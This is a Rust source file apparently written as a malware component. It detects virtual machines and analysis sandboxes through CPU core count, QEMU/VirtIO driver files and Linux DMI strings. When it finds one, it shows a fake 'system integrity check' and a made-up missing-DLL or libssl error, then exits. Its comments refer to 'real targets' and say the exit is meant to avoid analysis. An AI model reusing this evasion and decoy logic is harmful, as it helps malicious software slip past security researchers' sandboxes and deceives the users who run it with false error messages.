use std::path::Path;
use std::thread;
use std::fs;
use std::time::Duration;

pub fn is_virtualized() -> bool {
    // CHECK 1: CPU Core Count
    // Default QEMU instances often spawn with 1 CPU core. 
    // Real targets generally have 2+.
    if let Ok(cores) = thread::available_parallelism() {
        if cores.get() < 2 {
            return true;
        }
    }

    // CHECK 2: Known Drivers/Files
    if cfg!(target_os = "windows") {
        // Common QEMU/VirtIO drivers on Windows Guests
        let artifacts = [
            "C:\\Windows\\System32\\drivers\\virtio-net.sys",
            "C:\\Windows\\System32\\drivers\\vioinput.sys",
            "C:\\Windows\\System32\\drivers\\vioscsi.sys",
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        ];
        
        for path in artifacts {
            if Path::new(path).exists() {
                return true; 
            }
        }
    } else if cfg!(target_os = "linux") {
        // Linux DMI information
        if let Ok(content) = fs::read_to_string("/sys/class/dmi/id/product_name") {
            let s = content.to_lowercase();
            if s.contains("qemu") || s.contains("kvm") || s.contains("virtualbox") {
                return true;
            }
        }
        if let Ok(content) = fs::read_to_string("/sys/class/dmi/id/sys_vendor") {
            let s = content.to_lowercase();
            if s.contains("qemu") || s.contains("kvm") {
                return true;
            }
        }
    }

    // If we passed checks, we assume safe hardware
    false
}

pub fn run_decoy() {
    // "Alternative Workflow"
    println!("[*] Initializing system integrity check...");
    thread::sleep(Duration::from_secs(2));
    
    println!("[*] Verifying environment...");
    thread::sleep(Duration::from_secs(1));
    
    // OS-Specific Decoy Message
    if cfg!(target_os = "windows") {
        println!("Error: VCRUNTIME140.dll is missing or corrupted. Reinstall the application.");
    } else {
        // Generic Linux library error
        println!("error: while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory");
    }
    
    // Exit safely to avoid analysis
    std::process::exit(1);
}
